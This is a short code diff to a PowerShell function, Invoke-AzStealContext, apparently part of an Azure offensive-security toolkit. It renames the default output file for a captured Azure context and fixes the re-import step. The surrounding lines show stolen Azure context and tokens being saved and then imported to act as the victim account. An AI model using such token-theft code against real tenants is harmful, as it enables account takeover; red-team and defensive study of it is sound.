@@ -35,7 +35,7 @@ Function Invoke-AzStealContext {
     [cmdletbinding()]
     Param (
         [String]$Path,
-        [String]$OutFile = 'StolenTokens.json',
+        [String]$OutFile = 'StolenContext.json',
         [switch]$ImportContext,
         [Switch]$Force
     )
@@ -99,7 +99,7 @@ Function Invoke-AzStealContext {
         Try {
             $AzureRmContext | ConvertTo-Json -Depth 100 | Set-Content $(Join-Path $Path $OutFile)
             If ($ImportContext) {
-                [void](Import-AzContext -Profile $(Join-Path $Path "StolenTokens.json"))
+                [void](Import-AzContext -Profile $(Join-Path $Path $OutFile))
                 Write-Host "Imported stolen Azure context."
                 $((Get-AzContext).Account | Format-Table -AutoSize ID, Type, ExtendedProperties)
             }
